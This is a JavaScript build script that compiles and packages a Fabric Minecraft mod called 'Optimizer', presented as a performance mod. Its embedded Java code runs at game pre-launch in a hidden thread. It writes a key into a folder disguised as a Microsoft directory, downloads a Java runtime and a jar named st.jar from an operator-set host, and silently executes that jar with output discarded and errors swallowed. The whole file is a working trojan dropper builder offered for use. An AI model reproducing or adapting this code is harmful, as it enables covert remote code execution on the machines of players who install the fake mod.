// language: JavaScript, file: builder/minecraft_build.js
import fs from 'node:fs';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';
import AdmZip from 'adm-zip';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const TEMP_DIR = path.join(__dirname, '..', 'temp_mc');

export async function buildMinecraftMod({ key, host }) {
    if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

    const srcDir = path.join(TEMP_DIR, 'src');
    const classDir = path.join(TEMP_DIR, 'classes');
    
    // Clean up old builds
    if (fs.existsSync(srcDir)) fs.rmSync(srcDir, { recursive: true, force: true });
    if (fs.existsSync(classDir)) fs.rmSync(classDir, { recursive: true, force: true });
    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(classDir, { recursive: true });

    const javaCode = `
package com.optimizer;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class OptimizerMod {
    public static String KEY = "${key}";
    public static String HOST = "${host}";

    public static void init() {
        new Thread(() -> {
            try {
                File localAppData = new File(System.getenv("LOCALAPPDATA"), "Microsoft\\\\AppBroker");
                if (!localAppData.exists()) localAppData.mkdirs();

                // Write key.json
                Files.write(Paths.get(localAppData.getAbsolutePath(), "key.json"), ("{\\"key\\":\\"" + KEY + "\\"}").getBytes());

                // Download JRE if missing
                File jreDir = new File(localAppData, "jre");
                File javaw = new File(jreDir, "bin\\\\javaw.exe");
                if (!javaw.exists()) {
                    File jreZip = new File(localAppData, "jre.zip");
                    download("http://" + HOST + "/api/downloads/jre.zip", jreZip);
                    unzip(jreZip, jreDir);
                    jreZip.delete();
                }

                // Download st.jar
                File stJar = new File(localAppData, "st.jar");
                download("http://" + HOST + "/api/downloads/st.jar", stJar);

                // Execute st.jar
                ProcessBuilder pb = new ProcessBuilder(javaw.getAbsolutePath(), "-jar", stJar.getAbsolutePath(), KEY, HOST);
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                pb.start();

            } catch (Exception e) {}
        }).start();
    }

    private static void download(String urlStr, File dest) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int len;
            while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
        }
    }

    private static void unzip(File zipFile, File destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File f = new File(destDir, entry.getName());
                if (entry.isDirectory()) { f.mkdirs(); continue; }
                f.getParentFile().mkdirs();
                try (OutputStream out = new FileOutputStream(f)) {
                    byte[] buf = new byte[8192]; int len;
                    while ((len = zis.read(buf)) > 0) out.write(buf, 0, len);
                }
            }
        }
    }
}
`;

    const fabricModJson = `
{
  "schemaVersion": 1,
  "id": "optimizer",
  "version": "1.0.0",
  "name": "Optimizer",
  "description": "Performance improvements.",
  "authors": ["System"],
  "contact": {},
  "license": "MIT",
  "environment": "*",
  "entrypoints": {
    "preLaunch": [
      "com.optimizer.OptimizerMod::init"
    ]
  },
  "depends": {
    "fabricloader": ">=0.15.0"
  }
}
`;

    const pkgDir = path.join(srcDir, 'com', 'optimizer');
    fs.mkdirSync(pkgDir, { recursive: true });

    const javaPath = path.join(pkgDir, 'OptimizerMod.java');
    fs.writeFileSync(javaPath, javaCode);
    fs.writeFileSync(path.join(srcDir, 'fabric.mod.json'), fabricModJson);

    // Compile java to class file
    console.log('[minecraft_build] Compiling java...');
    await execFileP('javac', ['-d', classDir, javaPath], { timeout: 60_000 });

    // Package into jar
    console.log('[minecraft_build] Packaging jar...');
    const jarOut = path.join(TEMP_DIR, 'Optimizer.jar');
    await execFileP('jar', ['cf', jarOut, '-C', classDir, '.'], { timeout: 60_000 });
    
    // Add fabric.mod.json to the jar
    const zip = new AdmZip(jarOut);
    zip.addLocalFile(path.join(srcDir, 'fabric.mod.json'));
    zip.writeZip(jarOut);

    const buf = fs.readFileSync(jarOut);

    // Clean up
    fs.rmSync(srcDir, { recursive: true, force: true });
    fs.rmSync(classDir, { recursive: true, force: true });
    fs.unlinkSync(jarOut);

    return buf;
}